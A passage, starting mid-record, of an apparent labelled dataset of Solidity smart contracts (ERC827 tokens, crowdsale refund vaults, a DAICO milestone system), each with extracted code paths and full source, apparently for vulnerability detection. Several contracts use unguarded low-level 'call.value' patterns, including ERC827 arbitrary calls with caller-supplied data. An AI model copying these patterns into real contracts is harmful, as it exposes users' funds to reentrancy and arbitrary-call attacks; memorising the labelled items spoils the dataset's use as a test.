super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; contract AtripToken is ERC827Token { using SafeMath for uint256; string public name = \"Atrip Token\"; string public symbol = \"APK\"; uint public decimals = 18; address public wallet = 0x0; ", "third path": "function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; contract AtripToken is ERC827Token { using SafeMath for uint256; string public name = \"Atrip Token\"; string public symbol = \"APK\"; uint public decimals = 18; address public wallet = 0x0; ", "long path": "pragma solidity ^0.4.24; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval( address indexed owner, address indexed spender, uint256 value ); } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = ( allowed[msg.sender][_spender].add(_addedValue)); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract ERC827 is ERC20 { function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool); function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool); function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool); } contract ERC827Token is ERC827, StandardToken { function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; } function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; } function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; } function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; } function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; } } contract AtripToken is ERC827Token { using SafeMath for uint256; string public name = \"Atrip Token\"; string public symbol = \"APK\"; uint public decimals = 18; address public wallet = 0x0; constructor (address _wallet) public  { wallet = _wallet; totalSupply_ = 21 * 100000000 * 10 ** decimals; balances[wallet] = totalSupply_; } function() public{ revert(); } } "}
{"sol name": "30460.sol", "label": 0, "first path": "function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.call.value(this.balance)(); function forwardFunds() onlyOwner public { require(this.balance > 0); wallet.call.value(this.balance)(); contract FinalizableCrowdsale is BurnableCrowdsale, Ownable { using SafeMath for uint256; bool public isFinalized = false; event Finalized(); function forwardFundsToWallet(uint256 amount) internal { if (goalReached() && vault.balance > 0) { vault.forwardFunds(); if (goalReached()) { wallet.call.value(amount)(); } else { vault.deposit.value(amount)(msg.sender); ", "second path": "function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.call.value(this.balance)(); function forwardFunds() onlyOwner public { require(this.balance > 0); wallet.call.value(this.balance)(); contract FinalizableCrowdsale is BurnableCrowdsale, Ownable { using SafeMath for uint256; bool public isFinalized = false; event Finalized(); function forwardFundsToWallet(uint256 amount) internal { if (goalReached() && vault.balance > 0) { vault.forwardFunds(); if (goalReached()) { wallet.call.value(amount)(); } else { vault.deposit.value(amount)(msg.sender); ", "third path": "function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.call.value(this.balance)(); function forwardFunds() onlyOwner public { require(this.balance > 0); wallet.call.value(this.balance)(); contract FinalizableCrowdsale is BurnableCrowdsale, Ownable { using SafeMath for uint256; bool public isFinalized = false; event Finalized(); function forwardFundsToWallet(uint256 amount) internal { if (goalReached() && vault.balance > 0) { vault.forwardFunds(); if (goalReached()) { wallet.call.value(amount)(); } else { vault.deposit.value(amount)(msg.sender); ", "long path": "pragma solidity ^0.4.18; contract ERC20Basic { uint256 public totalSupply; function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract BurnableToken is StandardToken { event Burn(address indexed burner, uint256 value); function burn(uint256 _value) public { require(_value > 0); require(_value <= balances[msg.sender]); address burner = msg.sender; balances[burner] = balances[burner].sub(_value); totalSupply = totalSupply.sub(_value); Burn(burner, _value); } } contract Pausable is Ownable { event Pause(); event Unpause(); bool public paused = false; modifier whenNotPaused() { require(!paused); _; } modifier whenPaused() { require(paused); _; } function pause() onlyOwner whenNotPaused public { paused = true; Pause(); } function unpause() onlyOwner whenPaused public { paused = false; Unpause(); } } contract PausableToken is StandardToken, Pausable { function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) { return super.transfer(_to, _value); } function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) { return super.transferFrom(_from, _to, _value); } function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) { return super.approve(_spender, _value); } function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) { return super.increaseApproval(_spender, _addedValue); } function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) { return super.decreaseApproval(_spender, _subtractedValue); } } contract BullToken is BurnableToken, PausableToken { string public constant name = \"BullToken\"; string public constant symbol = \"BULL\"; uint256 public constant decimals = 18; uint256 public constant INITIAL_SUPPLY = 55000000; bool public transferEnabled; mapping (address => bool) public isHolder; address [] public holders; function BullToken() public { totalSupply = INITIAL_SUPPLY * 10 ** uint256(decimals); balances[msg.sender] = totalSupply; transferEnabled = false; } function enableTransfers() onlyOwner public { transferEnabled = true; TransferEnabled(); } function disableTransfers() onlyOwner public { transferEnabled = false; TransferDisabled(); } function transfer(address to, uint256 value) public returns (bool) { require(transferEnabled || msg.sender == owner); if (!isHolder[to]) { holders.push(to); isHolder[to] = true; } return super.transfer(to, value); } function transferFrom(address from, address to, uint256 value) public returns (bool) { require(transferEnabled || from == owner); if (!isHolder[to]) { holders.push(to); isHolder[to] = true; } return super.transferFrom(from, to, value); } event TransferEnabled(); event TransferDisabled(); } contract Curatable is Ownable { address public curator; event CurationRightsTransferred(address indexed previousCurator, address indexed newCurator); function Curatable() public { owner = msg.sender; curator = owner; } modifier onlyCurator() { require(msg.sender == curator); _; } function transferCurationRights(address newCurator) public onlyOwner { require(newCurator != address(0)); CurationRightsTransferred(curator, newCurator); curator = newCurator; } } contract Whitelist is Curatable { mapping (address => bool) public whitelist; function Whitelist() public { } function addInvestor(address investor) external onlyCurator { require(investor != 0x0 && !whitelist[investor]); whitelist[investor] = true; } function removeInvestor(address investor) external onlyCurator { require(investor != 0x0 && whitelist[investor]); whitelist[investor] = false; } function isWhitelisted(address investor) constant external returns (bool result) { return whitelist[investor]; } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract BurnableCrowdsale { using SafeMath for uint256; BurnableToken public token; uint256 public startTime; uint256 public endTime; address public wallet; uint256 public rate; uint256 public weiRaised; address public tokenAddress; event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount); function BurnableCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet, address _tokenAddress) public { require(_startTime >= now); require(_endTime >= _startTime); require(_rate > 0); require(_wallet != address(0)); tokenAddress = _tokenAddress; token = createTokenContract(); startTime = _startTime; endTime = _endTime; rate = _rate; wallet = _wallet; } function createTokenContract() internal returns (BurnableToken) { return new BurnableToken(); } function () external payable { buyTokens(msg.sender); } function buyTokens(address beneficiary) public payable { } function forwardFunds() internal { } function validPurchase() internal view returns (bool) { bool withinPeriod = now >= startTime && now <= endTime; bool nonZeroPurchase = msg.value != 0; return withinPeriod && nonZeroPurchase; } function hasEnded() public view returns (bool) { return now > endTime; } } contract CappedCrowdsale is BurnableCrowdsale { using SafeMath for uint256; uint256 public cap; function CappedCrowdsale(uint256 _cap) public { require(_cap > 0); cap = _cap; } function validPurchase() internal view returns (bool) { bool withinCap = weiRaised.add(msg.value) <= cap; return super.validPurchase() && withinCap; } function hasEnded() public view returns (bool) { bool capReached = weiRaised >= cap; return super.hasEnded() || capReached; } } contract RefundVault is Ownable { using SafeMath for uint256; enum State { Active, Refunding, Closed } mapping (address => uint256) public deposited; address public wallet; State public state; event Closed(); event RefundsEnabled(); event Refunded(address indexed beneficiary, uint256 weiAmount); function RefundVault(address _wallet) public { require(_wallet != address(0)); wallet = _wallet; state = State.Active; } function deposit(address investor) onlyOwner public payable { require(state == State.Active); deposited[investor] = deposited[investor].add(msg.value); } function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.transfer(this.balance); } function enableRefunds() onlyOwner public { require(state == State.Active); state = State.Refunding; RefundsEnabled(); } function refund(address investor) public { require(state == State.Refunding); uint256 depositedValue = deposited[investor]; deposited[investor] = 0; investor.transfer(depositedValue); Refunded(investor, depositedValue); } } contract BullTokenRefundVault is RefundVault { function BullTokenRefundVault(address _wallet) public RefundVault(_wallet) {} function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.call.value(this.balance)(); } function forwardFunds() onlyOwner public { require(this.balance > 0); wallet.call.value(this.balance)(); } } contract FinalizableCrowdsale is BurnableCrowdsale, Ownable { using SafeMath for uint256; bool public isFinalized = false; event Finalized(); function finalize() onlyOwner public { require(!isFinalized); require(hasEnded()); finalization(); Finalized(); isFinalized = true; } function finalization() internal { } } contract RefundableCrowdsale is FinalizableCrowdsale { using SafeMath for uint256; uint256 public goal; BullTokenRefundVault public vault; function RefundableCrowdsale(uint256 _goal) public { require(_goal > 0); vault = new BullTokenRefundVault(wallet); goal = _goal; } function forwardFunds() internal { vault.deposit.value(msg.value)(msg.sender); } function claimRefund() public { require(isFinalized); require(!goalReached()); vault.refund(msg.sender); } function finalization() internal { if (goalReached()) { vault.close(); } else { vault.enableRefunds(); } super.finalization(); } function goalReached() public view returns (bool) { return weiRaised >= goal; } } contract BullTokenCrowdsale is CappedCrowdsale, RefundableCrowdsale { using SafeMath for uint256; Whitelist public whitelist; uint256 public minimumInvestment; function BullTokenCrowdsale( uint256 _startTime, uint256 _endTime, uint256 _rate, uint256 _goal, uint256 _cap, uint256 _minimumInvestment, address _tokenAddress, address _wallet, address _whitelistAddress ) public CappedCrowdsale(_cap) FinalizableCrowdsale() RefundableCrowdsale(_goal) BurnableCrowdsale(_startTime, _endTime, _rate, _wallet, _tokenAddress) { require(_goal <= _cap); whitelist = Whitelist(_whitelistAddress); minimumInvestment = _minimumInvestment; } function createTokenContract() internal returns (BurnableToken) { return BullToken(tokenAddress); } function () external payable { buyTokens(msg.sender); } function buyTokens(address beneficiary) public payable { require(beneficiary != address(0)); require(whitelist.isWhitelisted(beneficiary)); uint256 weiAmount = msg.value; uint256 raisedIncludingThis = weiRaised.add(weiAmount); if (raisedIncludingThis > cap) { require(hasStarted() && !hasEnded()); uint256 toBeRefunded = raisedIncludingThis.sub(cap); weiAmount = cap.sub(weiRaised); beneficiary.transfer(toBeRefunded); } else { require(validPurchase()); } uint256 tokens = weiAmount.mul(rate); weiRaised = weiRaised.add(weiAmount); token.transferFrom(owner, beneficiary, tokens); TokenPurchase(msg.sender, beneficiary, weiAmount, tokens); forwardFundsToWallet(weiAmount); } function validPurchase() internal view returns (bool) { return super.validPurchase() && aboveMinimumInvestment(); } function hasEnded() public view returns (bool) { bool capReached = weiRaised.add(minimumInvestment) > cap; return super.hasEnded() || capReached; } function hasStarted() public constant returns (bool) { return now >= startTime; } function aboveMinimumInvestment() internal view returns (bool) { return msg.value >= minimumInvestment; } function forwardFundsToWallet(uint256 amount) internal { if (goalReached() && vault.balance > 0) { vault.forwardFunds(); } if (goalReached()) { wallet.call.value(amount)(); } else { vault.deposit.value(amount)(msg.sender); } } } "}
{"sol name": "4679.sol", "label": 0, "first path": "function giveToken(address _buyer) internal { require( pendingTokenUser[_buyer] > 0, \"pendingTokenUser[_buyer] > 0\" ); tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]); tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]); soldTokens = soldTokens.add(pendingTokenUser[_buyer]); pendingTokenUser[_buyer] = 0; require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256(\"forwardEther()\") ) ) ); etherUser[_buyer] = 0; function forwardEther() onlyRC payable public returns(bool) { require(milestoneSystem.call.value(msg.value)(), \"wallet.call.value(msg.value)()\"); return true; ", "second path": "function giveToken(address _buyer) internal { require( pendingTokenUser[_buyer] > 0, \"pendingTokenUser[_buyer] > 0\" ); tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]); tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]); soldTokens = soldTokens.add(pendingTokenUser[_buyer]); pendingTokenUser[_buyer] = 0; require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256(\"forwardEther()\") ) ) ); etherUser[_buyer] = 0; function forwardEther() onlyRC payable public returns(bool) { require(milestoneSystem.call.value(msg.value)(), \"wallet.call.value(msg.value)()\"); return true; ", "third path": "function giveToken(address _buyer) internal { require( pendingTokenUser[_buyer] > 0, \"pendingTokenUser[_buyer] > 0\" ); tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]); tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]); soldTokens = soldTokens.add(pendingTokenUser[_buyer]); pendingTokenUser[_buyer] = 0; require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256(\"forwardEther()\") ) ) ); etherUser[_buyer] = 0; function forwardEther() onlyRC payable public returns(bool) { require(milestoneSystem.call.value(msg.value)(), \"wallet.call.value(msg.value)()\"); return true; ", "long path": "pragma solidity ^0.4.24; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract Ownable { address public owner; address public newOwner; event OwnershipTransferred(address indexed oldOwner, address indexed newOwner); constructor() public { owner = msg.sender; newOwner = address(0); } modifier onlyOwner() { require(msg.sender == owner, \"msg.sender == owner\"); _; } function transferOwnership(address _newOwner) public onlyOwner { require(address(0) != _newOwner, \"address(0) != _newOwner\"); newOwner = _newOwner; } function acceptOwnership() public { require(msg.sender == newOwner, \"msg.sender == newOwner\"); emit OwnershipTransferred(owner, msg.sender); owner = msg.sender; newOwner = address(0); } } contract tokenInterface { function balanceOf(address _owner) public constant returns (uint256 balance); function transfer(address _to, uint256 _value) public returns (bool); function burn(uint256 _value) public returns(bool); uint256 public totalSupply; uint256 public decimals; } contract AtomaxKycInterface { function started() public view returns(bool); function ended() public view returns(bool); function startTime() public view returns(uint256); function endTime() public view returns(uint256); function totalTokens() public view returns(uint256); function remainingTokens() public view returns(uint256); function price() public view returns(uint256); } contract AtomaxKyc { using SafeMath for uint256; mapping (address => bool) public isKycSigner; mapping (bytes32 => uint256) public alreadyPayed; event KycVerified(address indexed signer, address buyerAddress, bytes32 buyerId, uint maxAmount); constructor() internal { isKycSigner[0x9787295cdAb28b6640bc7e7db52b447B56b1b1f0] = true; isKycSigner[0x3b3f379e49cD95937121567EE696dB6657861FB0] = true; } function releaseTokensTo(address buyer) internal returns(bool); function buyTokensFor(address _buyerAddress, bytes32 _buyerId, uint _maxAmount, uint8 _v, bytes32 _r, bytes32 _s, uint8 _bv, bytes32 _br, bytes32 _bs) public payable returns (bool) { bytes32 hash = hasher ( _buyerAddress,  _buyerId,  _maxAmount ); address signer = ecrecover(hash, _bv, _br, _bs); require ( signer == _buyerAddress, \"signer == _buyerAddress \" ); return buyImplementation(_buyerAddress, _buyerId, _maxAmount, _v, _r, _s); } function buyTokens(bytes32 buyerId, uint maxAmount, uint8 v, bytes32 r, bytes32 s) public payable returns (bool) { return buyImplementation(msg.sender, buyerId, maxAmount, v, r, s); } function buyImplementation(address _buyerAddress, bytes32 _buyerId, uint256 _maxAmount, uint8 _v, bytes32 _r, bytes32 _s) private returns (bool) { bytes32 hash = hasher ( _buyerAddress,  _buyerId,  _maxAmount ); address signer = ecrecover(hash, _v, _r, _s); require( isKycSigner[signer], \"isKycSigner[signer]\"); uint256 totalPayed = alreadyPayed[_buyerId].add(msg.value); require(totalPayed <= _maxAmount); alreadyPayed[_buyerId] = totalPayed; emit KycVerified(signer, _buyerAddress, _buyerId, _maxAmount); return releaseTokensTo(_buyerAddress); } function hasher (address _buyerAddress, bytes32 _buyerId, uint256 _maxAmount) public view returns ( bytes32 hash ) { hash = keccak256(abi.encodePacked(\"Atomax authorization:\", this, _buyerAddress, _buyerId, _maxAmount)); } } contract RC_KYC is AtomaxKycInterface, AtomaxKyc { using SafeMath for uint256; TokedoDaico tokenSaleContract; uint256 public startTime; uint256 public endTime; uint256 public etherMinimum; uint256 public soldTokens; uint256 public remainingTokens; uint256 public tokenPrice; mapping(address => uint256) public etherUser; mapping(address => uint256) public pendingTokenUser; mapping(address => uint256) public tokenUser; constructor(address _tokenSaleContract, uint256 _tokenPrice, uint256 _remainingTokens, uint256 _etherMinimum, uint256 _startTime , uint256 _endTime) public { require ( _tokenSaleContract != address(0), \"_tokenSaleContract != address(0)\" ); require ( _tokenPrice != 0, \"_tokenPrice != 0\" ); require ( _remainingTokens != 0, \"_remainingTokens != 0\" ); require ( _startTime != 0, \"_startTime != 0\" ); require ( _endTime != 0, \"_endTime != 0\" ); tokenSaleContract = TokedoDaico(_tokenSaleContract); soldTokens = 0; remainingTokens = _remainingTokens; tokenPrice = _tokenPrice; etherMinimum = _etherMinimum; startTime = _startTime; endTime = _endTime; } modifier onlyTokenSaleOwner() { require(msg.sender == tokenSaleContract.owner() ); _; } function setTime(uint256 _newStart, uint256 _newEnd) public onlyTokenSaleOwner { if ( _newStart != 0 ) startTime = _newStart; if ( _newEnd != 0 ) endTime = _newEnd; } function changeMinimum(uint256 _newEtherMinimum) public onlyTokenSaleOwner { etherMinimum = _newEtherMinimum; } function releaseTokensTo(address buyer) internal returns(bool) { if( msg.value > 0 ) takeEther(buyer); giveToken(buyer); return true; } function started() public view returns(bool) { return now > startTime || remainingTokens == 0; } function ended() public view returns(bool) { return now > endTime || remainingTokens == 0; } function startTime() public view returns(uint) { return startTime; } function endTime() public view returns(uint) { return endTime; } function totalTokens() public view returns(uint) { return remainingTokens.add(soldTokens); } function remainingTokens() public view returns(uint) { return remainingTokens; } function price() public view returns(uint) { return uint256(1 ether).div( tokenPrice ).mul( 10 ** uint256(tokenSaleContract.decimals()) ); } function () public payable{ takeEther(msg.sender); } event TakeEther(address buyer, uint256 value, uint256 soldToken, uint256 tokenPrice ); function takeEther(address _buyer) internal { require( now > startTime, \"now > startTime\" ); require( now < endTime, \"now < endTime\"); require( msg.value >= etherMinimum, \"msg.value >= etherMinimum\"); require( remainingTokens > 0, \"remainingTokens > 0\" ); uint256 oneToken = 10 ** uint256(tokenSaleContract.decimals()); uint256 tokenAmount = msg.value.mul( oneToken ).div( tokenPrice ); uint256 remainingTokensGlobal = tokenInterface( tokenSaleContract.tokenContract() ).balanceOf( address(tokenSaleContract) ); uint256 remainingTokensApplied; if ( remainingTokensGlobal > remainingTokens ) { remainingTokensApplied = remainingTokens; } else { remainingTokensApplied = remainingTokensGlobal; } uint256 refund = 0; if ( remainingTokensApplied < tokenAmount ) { refund = (tokenAmount - remainingTokensApplied).mul(tokenPrice).div(oneToken); tokenAmount = remainingTokensApplied; remainingTokens = 0; _buyer.transfer(refund); } else { remainingTokens = remainingTokens.sub(tokenAmount); } etherUser[_buyer] = etherUser[_buyer].add(msg.value.sub(refund)); pendingTokenUser[_buyer] = pendingTokenUser[_buyer].add(tokenAmount); emit TakeEther( _buyer, msg.value, tokenAmount, tokenPrice ); } function giveToken(address _buyer) internal { require( pendingTokenUser[_buyer] > 0, \"pendingTokenUser[_buyer] > 0\" ); tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]); tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]); soldTokens = soldTokens.add(pendingTokenUser[_buyer]); pendingTokenUser[_buyer] = 0; require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256(\"forwardEther()\") ) ) ); etherUser[_buyer] = 0; } function refundEther(address to) public onlyTokenSaleOwner { to.transfer(etherUser[to]); etherUser[to] = 0; pendingTokenUser[to] = 0; } function withdraw(address to, uint256 value) public onlyTokenSaleOwner { to.transfer(value); } function userBalance(address _user) public view returns( uint256 _pendingTokenUser, uint256 _tokenUser, uint256 _etherUser ) { return (pendingTokenUser[_user], tokenUser[_user], etherUser[_user]); } } contract TokedoDaico is Ownable { using SafeMath for uint256; tokenInterface public tokenContract; address public milestoneSystem; uint256 public decimals; uint256 public tokenPrice; mapping(address => bool) public rc; constructor(address _wallet, address _tokenAddress, uint256[] _time, uint256[] _funds, uint256 _tokenPrice, uint256 _activeSupply) public { tokenContract = tokenInterface(_tokenAddress); decimals = tokenContract.decimals(); tokenPrice = _tokenPrice; milestoneSystem = new MilestoneSystem(_wallet,_tokenAddress, _time, _funds, _tokenPrice, _activeSupply); } modifier onlyRC() { require( rc[msg.sender], \"rc[msg.sender]\" ); _; } function forwardEther() onlyRC payable public returns(bool) { require(milestoneSystem.call.value(msg.value)(), \"wallet.call.value(msg.value)()\"); return true; } function sendTokens(address _buyer, uint256 _amount) onlyRC public returns(bool) { return tokenContract.transfer(_buyer, _amount); } event NewRC(address contr); function addRC(address _rc) onlyOwner public { rc[ _rc ]  = true; emit NewRC(_rc); } function withdrawTokens(address to, uint256 value) public onlyOwner returns (bool) { return tokenContract.transfer(to, value); } function setTokenContract(address _tokenContract) public onlyOwner { tokenContract = tokenInterface(_tokenContract); } } contract MilestoneSystem { using SafeMath for uint256; tokenInterface public tokenContract; TokedoDaico public tokenSaleContract; uint256[] public time; uint256[] public funds; bool public locked = false; uint256 public endTimeToReturnTokens; uint8 public step = 0; uint256 public constant timeframeMilestone = 3 days; uint256 public constant timeframeDeath = 30 days; uint256 public activeSupply; uint256 public tokenPrice; uint256 public etherReceived; address public wallet; mapping(address => mapping(uint8 => uint256) ) public balance; mapping(uint8 => uint256) public tokenDistrusted; constructor(address _wallet, address _tokenAddress, uint256[] _time, uint256[] _funds, uint256 _tokenPrice, uint256 _activeSupply) public { require( _wallet != address(0), \"_wallet != address(0)\" ); require( _time.length != 0, \"_time.length != 0\" ); require( _time.length == _funds.length, \"_time.length == _funds.length\" ); wallet = _wallet; tokenContract = tokenInterface(_tokenAddress); tokenSaleContract = TokedoDaico(msg.sender); time = _time; funds = _funds; activeSupply = _activeSupply; tokenPrice = _tokenPrice; } modifier onlyTokenSaleOwner() { require(msg.sender == tokenSaleContract.owner(), \"msg.sender == tokenSaleContract.owner()\" ); _; } event Distrust(address sender, uint256 amount); event Locked(); function distrust(address _from, uint _value, bytes _data) public { require(msg.sender == address(tokenContract), \"msg.sender == address(tokenContract)\"); if ( !locked ) { uint256 startTimeMilestone = time[step].sub(timeframeMilestone); uint256 endTimeMilestone = time[step]; uint256 startTimeProjectDeath = time[step].add(timeframeDeath); bool unclaimedFunds = funds[step] > 0; require( ( now > startTimeMilestone && now < endTimeMilestone ) || ( now > startTimeProjectDeath && unclaimedFunds ), \"( now > startTimeMilestone && now < endTimeMilestone ) || ( now > startTimeProjectDeath && unclaimedFunds )\" ); } else { require( locked && now < endTimeToReturnTokens ); } balance[_from][step] = balance[_from][step].add(_value); tokenDistrusted[step] = tokenDistrusted[step].add(_value); emit Distrust(msg.sender, _value); if( tokenDistrusted[step] > activeSupply && !locked ) { locked = true; endTimeToReturnTokens = now.add(timeframeDeath); emit Locked(); } } function tokenFallback(address _from, uint _value, bytes _data) public { distrust( _from, _value, _data); } function receiveApproval( address _from, uint _value, bytes _data) public { require(msg.sender == address(tokenContract), \"msg.sender == address(tokenContract)\"); require(msg.sender.call(bytes4(keccak256(\"transferFrom(address,address,uint256)\")), _from, this, _value)); distrust( _from, _value, _data); } event Trust(address sender, uint256 amount); event Unlocked(); function trust(uint8 _step) public { require( balance[msg.sender][_step] > 0 , \"balance[msg.sender] > 0\"); uint256 amount = balance[msg.sender][_step]; balance[msg.sender][_step] = 0; 